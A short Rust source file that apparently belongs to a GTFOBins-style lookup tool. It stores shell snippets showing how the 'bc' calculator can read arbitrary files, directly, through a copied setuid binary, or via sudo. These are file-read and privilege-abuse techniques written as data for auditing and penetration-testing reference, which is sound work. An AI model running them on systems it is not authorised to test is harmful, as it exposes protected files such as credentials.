
pub static BIN_NAME: &'static str = "bc";
pub static BIN_DESC: &'static str = "The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitrary binary files.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    bc -s $LFILE
    quit
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which bc) .

    LFILE=file_to_read
    ./bc -s $LFILE
    quit
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo bc -s $LFILE
    quit
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
